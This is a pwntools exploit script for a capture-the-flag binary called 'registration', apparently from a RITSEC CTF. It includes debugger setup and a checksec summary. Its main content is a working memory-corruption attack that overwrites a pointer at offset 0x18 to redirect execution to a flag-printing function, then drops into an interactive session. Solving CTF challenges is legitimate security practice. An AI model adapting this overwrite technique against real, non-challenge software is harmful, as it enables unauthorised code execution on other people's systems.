#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './registration'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'starship-registration.ctf.ritsec.club', 32680

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    b *0x4abddb
    b *0x4abfa2
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1574)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/ctf/registration"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='registration')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      No RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No
#     Debuginfo:  Yes

def exploit():
    global io
    io = initialize()
    io.sendline()
    offset = 0x18
    win = elf.sym["main.displayShipFlag"]
    target = 0x4d92b0 # Contain win address
    payload = flat({
        offset: target
    })
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", payload)
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter(": ", b"-1")
    io.sendlineafter("choice: ", "2")
    io.interactive()

if __name__ == '__main__':
    exploit()
